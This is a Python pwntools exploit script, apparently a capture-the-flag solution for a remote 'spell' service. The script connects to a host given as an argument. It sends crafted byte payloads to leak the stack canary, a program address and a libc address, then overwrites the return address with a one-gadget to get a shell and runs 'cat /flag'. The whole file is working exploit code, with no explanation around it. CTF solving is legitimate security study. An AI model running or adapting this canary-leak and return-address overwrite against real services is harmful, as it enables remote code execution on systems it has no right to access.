from pwn import *
context.log_level='debug'
context.arch='amd64'
ip=sys.argv[1]
port=int(sys.argv[2])
sh = remote(ip,port)

sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
libc=ELF('./pwn2/libc-2.31.so')
def debug():
	gdb.attach(sh)
	pause()

ru("Please enter the length of your spell>")
sd('1234\x00\x00\x00\x00')
ru("> ")
py = ''
py += '\x00\x00\x01\x00'+'\x01\x00\x00\x00'

py += '\x01\x00\x05\x00'+'\x01\x02'
py += 'a'*10
py += "\x02\x7e\x00"
py = py.ljust(1234,'a')
sd(py)

ru("Please enter the length of your spell>")
sd('1234\x00\x00\x00\x00')
ru("> ")
py = ''
py += '\x00\x00\x01\x00'+'\x01\x00\x00\x00'

py += '\x01\x00\x05\x00'+'\x01\x02'
py += 'a'*10
py += "\x04\x7f\x00"
py = py.ljust(1234,'a')
sd(py)
ru("Device is ")
canary=u64(rc(8))-0x3b
leak("canary",canary)

ru("Please enter the length of your spell>")
sd('1234\x00\x00\x00\x00')
ru("> ")
py = ''
py += '\x00\x00\x01\x00'+'\x01\x00\x00\x00'

py += '\x01\x00\x05\x00'+'\x01\x02'
py += 'a'*10
py += "\x02\x7e\x00"
py += p64(canary)*0x80
py = py.ljust(1234,'a')
sd(py)

ru("Please enter the length of your spell>")
sd('1234\x00\x00\x00\x00')
ru("> ")
py = ''
py += '\x00\x00\x01\x00'+'\x01\x00\x00\x00'

py += '\x01\x00\x05\x00'+'\x01\x02'
py += 'a'*10
py += "\x04\x80\x00"
py = py.ljust(1234,'a')
sd(py)
ru("Device is ")
addr=u64(rc(6).ljust(8,"\x00"))
leak("addr",addr)

# debug()
ru("Please enter the length of your spell>")
sd('1234\x00\x00\x00\x00')
ru("> ")
py = ''
py += '\x00\x00\x01\x00'+'\x01\x00\x00\x00'

py += '\x01\x00\x05\x00'+'\x01\x02'
py += 'a'*10
py += "\x02\x60\x00"
py += "\x00\x00\x00\x00"*5
py = py.ljust(1234,'a')
sd(py)
# debug()

ru("Please enter the length of your spell>")
sd('1234\x00\x00\x00\x00')
ru("> ")
py = ''
py += '\x00\x00\x01\x00'+'\x01\x00\x00\x00'

py += '\x01\x00\x05\x00'+'\x01\x02'
py += 'a'*10
py += "\x04\x75\x00"
py = py.ljust(1234,'a')
sd(py)

libc_addr=u64(ru("\x7f")[-6:].ljust(8,"\x00"))
leak("libc_addr",libc_addr)
libc_base=libc_addr-0x93ad1
leak("libc_base",libc_base)
system=libc_base+libc.sym['system']
binsh=libc_base+libc.search("/bin/sh").next()
poprdi=libc_base+0x0000000000026b72

ru("Please enter the length of your spell>")
sd('1234\x00\x00\x00\x00')
ru("> ")
py = ''
py += '\x00\x00\x01\x00'+'\x01\x00\x00\x00'

py += '\x01\x00\x05\x00'+'\x01\x02'
py += 'a'*10
py += "\x02\x80\x00"
py = py.ljust(1234,'a')
sd(py)
one=libc_base+0xe6c81
leak("poprdi",poprdi)
# debug()
ru("Please enter the length of your spell>")
sd('1234\x00\x00\x00\x00')
ru("> ")
py = ''
py += '\x00\x00\x01\x00'+'\x01\x00\x00\x00'

py += '\x01\x00\x05\x00'+'\x01\x02'
py += 'a'*10
py += "\x06\x30\x00\x80\x00"
py += p64(canary)*3+p64(one)
py = py.ljust(1234,'a')
sd(py)

sl('cat /flag')
# print("flag{123213213213213}")      
print(sh.recvrepeat(1))
# ti()